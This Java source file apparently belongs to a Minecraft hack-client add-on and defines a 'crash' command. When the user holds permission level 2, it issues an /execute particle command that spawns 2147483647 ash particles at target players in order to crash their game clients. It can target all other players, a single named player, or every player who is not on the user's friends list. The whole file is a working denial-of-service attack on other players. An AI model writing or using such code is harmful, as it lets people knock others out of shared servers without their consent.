package pwn.noobs.trouserstreak.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.commands.arguments.PlayerListEntryArgumentType;
import meteordevelopment.meteorclient.systems.friends.Friends;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.multiplayer.ClientSuggestionProvider;
import net.minecraft.client.multiplayer.PlayerInfo;
import net.minecraft.commands.SharedSuggestionProvider;
import net.minecraft.network.chat.Component;
import pwn.noobs.trouserstreak.utils.PermissionUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "Crash players, requires permission level 2 or higher");
    }

    private CopyOnWriteArrayList<PlayerInfo> players;

    @Override
    public void build(LiteralArgumentBuilder<ClientSuggestionProvider> builder) {
        builder.executes(ctx -> {
            players = new CopyOnWriteArrayList<>(mc.getConnection().getOnlinePlayers());
            if (players.size() <= 1) {
                error("No other players found on the server");
                return SINGLE_SUCCESS;
            }
            if (PermissionUtils.getPermissionLevel(mc.player) >= 2) {
                ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().tryCollapseToString()
                        + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"
                        + mc.player.getName().tryCollapseToString() + "]");
                StringBuilder playerNames = new StringBuilder("Crashing players: ");
                for (PlayerInfo player : players) {
                    if (!player.getProfile().id().equals(mc.player.getGameProfile().id())) {
                        playerNames.append(player.getProfile().name()).append(", ");
                    }
                }
                playerNames.setLength(playerNames.length() - 2); // Remove the extra comma and space at the end
                ChatUtils.sendMsg(Component.nullToEmpty(playerNames.toString()));
                return SINGLE_SUCCESS;
            } else if (PermissionUtils.getPermissionLevel(mc.player) < 2)
                error("Must have permission level 2 or higher");
            return SINGLE_SUCCESS;
        });
        builder.then(argument("player", PlayerListEntryArgumentType.create()).executes(context -> {
            GameProfile profile = PlayerListEntryArgumentType.get(context).getProfile();
            if (profile != null) {
                if (mc.getConnection().getOnlinePlayers().stream()
                        .anyMatch(player -> player.getProfile().id().equals(profile.id()))) {
                    if (PermissionUtils.getPermissionLevel(mc.player) >= 2) {
                        ChatUtils.sendPlayerMsg("/execute at " + profile.name()
                                + " run particle ash ~ ~ ~ 1 1 1 1 2147483647 force " + profile.name());
                        ChatUtils.sendMsg(Component.nullToEmpty("Crashing player: " + profile.name()));
                    } else if (PermissionUtils.getPermissionLevel(mc.player) < 2)
                        error("Must have permission level 2 or higher");
                } else {
                    error("Player not found in the current server");
                }
            } else {
                error("Player profile not found");
            }
            return SINGLE_SUCCESS;
        }));
        builder.then(literal("@allNonFriends").executes(ctx -> {
            players = new CopyOnWriteArrayList<>(mc.getConnection().getOnlinePlayers());
            if (players.size() <= 1) {
                error("No other players found on the server");
                return SINGLE_SUCCESS;
            }
            if (PermissionUtils.getPermissionLevel(mc.player) >= 2) {
                List<String> friendNames = new ArrayList<>();
                friendNames.add("name=!" + mc.player.getName().tryCollapseToString());
                for(PlayerInfo player : players) {
                    if(Friends.get().isFriend(player)) friendNames.add("name=!" + player.getProfile().name());
                }
                String friendsString = String.join(",", friendNames);
                String thecommand = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
                if (thecommand.length()<=256){
                    ChatUtils.sendPlayerMsg(thecommand);
                    StringBuilder playerNames = new StringBuilder("Crashing players (non-friends): ");
                    for (PlayerInfo player : players) {
                        if (!player.getProfile().id().equals(mc.player.getGameProfile().id()) && !Friends.get().isFriend(player)) {
                            playerNames.append(player.getProfile().name()).append(", ");
                        }
                    }
                    playerNames.setLength(playerNames.length() - 2); // Remove the extra comma and space at the end
                    ChatUtils.sendMsg(Component.nullToEmpty(playerNames.toString()));
                }
                else {
                    error("Crash all players command is too long, you have too many friends online.");
                }
                return SINGLE_SUCCESS;
            } else if (PermissionUtils.getPermissionLevel(mc.player) < 2)
                error("Must have permission level 2 or higher");
            return SINGLE_SUCCESS;
        }));
    }
}